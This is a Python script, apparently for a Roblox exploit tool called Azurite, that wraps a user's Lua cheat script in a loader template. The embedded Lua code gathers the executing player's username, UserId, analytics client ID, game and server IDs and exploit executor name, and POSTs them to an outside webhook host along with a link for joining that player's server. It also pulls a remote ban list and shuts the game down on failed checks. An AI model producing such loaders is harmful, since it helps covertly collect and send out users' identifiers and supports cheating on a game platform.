import os,time
banner = """
             █████╗ ███████╗██╗   ██╗██████╗ ██╗████████╗███████╗
            ██╔══██╗╚══███╔╝██║   ██║██╔══██╗██║╚══██╔══╝██╔════╝
            ███████║  ███╔╝ ██║   ██║██████╔╝██║   ██║   █████╗  
            ██╔══██║ ███╔╝  ██║   ██║██╔══██╗██║   ██║   ██╔══╝  
            ██║  ██║███████╗╚██████╔╝██║  ██║██║   ██║   ███████╗
            ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝   ╚═╝   ╚══════╝
                                                                
"""
def r():
    os.system('cls')
    print(banner)
r()
scriptid = input("[#] Enter Script Id  : ")
r()
print('[+] Getting Script In main.lua')
time.sleep(1)
with open('main.lua', mode="r", encoding="utf-8") as r: script = r.read()
final = """
local functionmain = {}
shared.scriptid = [[%scriptid%]]

function functionmain.webhookmain(json)
    local mm = {
        url = "https://websec.services/send/62e96ea57907ab0a63d4d605",
        rq = http_request or request or HttpPost or syn.request,
        nd = game:GetService("HttpService"):JSONEncode(json),
        hd = {["content-type"] = "application/json"}
    }
    mm.rq({Url = mm.url, Body = mm.nd, Method = "POST", Headers = mm.hd})
end
function functionmain.webhooksend(message)
    local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or getexecutorname() and "Scriptware"
    local json = {
        ["content"] = null,
        ["embeds"] = {
          {
            ["color"] = 15658734,
            ["image"] = {
                ["url"] = "https://cdn.discordapp.com/attachments/937676143761440799/1004161716239749240/standard.gif"
            }
          },
          {
            ["title"] = "Output",
            ["description"] = "★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★\\n\\n**"..message.."**",
            ["color"] = 15658734
          },
          {
            ["title"] = "User's informations",
            ["description"] = "★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★\\n\\n★ **Username : "..tostring(game.Players.LocalPlayer.Name).."** \\n★ **DisplayName : "..tostring(game.Players.LocalPlayer.DisplayName).."**\\n★ **UserID: "..tostring(game.Players.LocalPlayer.UserId).."**\\n★ **Profile: [Click Here](https://roblox.com/users/"..tostring(game.Players.LocalPlayer.UserId).."/profile)**",
            ["color"] = 15658734
          },
          {
            ["title"] = "Game's informations",
            ["description"] = "★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★\\n\\n★ **Game ID : "..game.PlaceId.."** \\n★ **Game Name : "..game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name.."**\\n★ **Profile: [Click Here](https://roblox.com/games/"..tostring(game.PlaceId)..")**",
            ["color"] = 15658734
          },
          {
            ["title"] = "Other information",
            ["description"] = "★━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━★\\n\\n★ **ClientID : "..tostring(game:GetService("RbxAnalyticsService"):GetClientId()).."** \\n★ **Executor : "..webhookcheck.."** \\n★ **ScriptID : "..shared.scriptid.."**",
            ["color"] = 15658734
          }
        }
    }
    local js = {
        ["username"] = "Logs",
        ["content"] = "**Join User :**  (https://web.roblox.com/home?placeID="..game.PlaceId.."&gameID"..game.JobId..")  \\n\\n\\n\\n **You need this extension** (https://chrome.google.com/webstore/detail/rogold/mafcicncghogpdpaieifglifaagndbni)",
        ["embeds"] = {
            {
                ["title"] = "**Someone Executed Script**",
                ["description"] = string.format("", game.Players.LocalPlayer.UserId, game.Players.LocalPlayer.Name, ((not (game.Players.LocalPlayer.DisplayName == game.Players.LocalPlayer.Name) and game.Players.LocalPlayer.DisplayName ) or ' N/A '), game.Players.LocalPlayer.UserId),
                ["type"] = "rich",
                ["color"] = color,
                ["image"] = {
                    ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..tostring(game:GetService("Players").LocalPlayer.Name)
                }
            }
        }
    }
    local mm = {
        url = "https://websec.services/send/62e96ea57907ab0a63d4d605",
        rq = http_request or request or HttpPost or syn.request,
        nd = game:GetService("HttpService"):JSONEncode(json),
        hd = {["content-type"] = "application/json"}
    }
    mm.rq({Url = mm.url, Body = mm.nd, Method = "POST", Headers = mm.hd})
end
function functionmain.__init__()
%script%
end
function __run__(sid)
    srid = tostring(sid)
    if string.find(srid, "/927/") then
        if string.find(srid, "/049/") then
            if string.find(srid, "/001/") then
                if string.find(srid, "/786/") then
                    if string.find(srid, "897/") then
                        if string.len(srid) > 568 then
                            local data = game:GetService("HttpService"):JSONDecode(tostring(game:HttpGet("https://raw.githubusercontent.com/DaFrenchTokio/Azurite/main/lib/data.txt", true)))
                            local detected = false
                            for i,v in pairs(data.m) do 
                                if v == tostring(game:GetService("RbxAnalyticsService"):GetClientId()) or v == tostring(game.Players.LocalPlayer.UserId) then
                                    detected = true
                                end
                            end
                            if detected == false then
                                if not shared._AzuriteOnTop_Executed then
                                    shared._AzuriteOnTop_Executed = "shared._AzuriteOnTop_Executed"
                                    functionmain.webhooksend("No Problem Detected")
                                    functionmain.__init__()
                                end
                            else
                                functionmain.webhooksend("Client ID/UserID Banned")
                                game:shutdown()
                            end
                        end
                    else
                        functionmain.webhooksend("897/ not detected")
                        game:shutdown()
                    end
                else
                    functionmain.webhooksend("/786/ not detected")
                    game:shutdown()
                end
            else
                functionmain.webhooksend("/001/ not detected")
                game:shutdown()
            end
        else
            functionmain.webhooksend("/049/ not detected")
            game:shutdown()
        end
    else
        functionmain.webhooksend("/927/ not detected")
        game:shutdown()
    end
end
__run__(shared.scriptid)
""".replace('%scriptid%',scriptid).replace('%script%',script)
with open('final.lua', mode="w", encoding="utf-8") as f:
    f.write(final)
    print('[!] Finished')
    os.system('pause >nul')
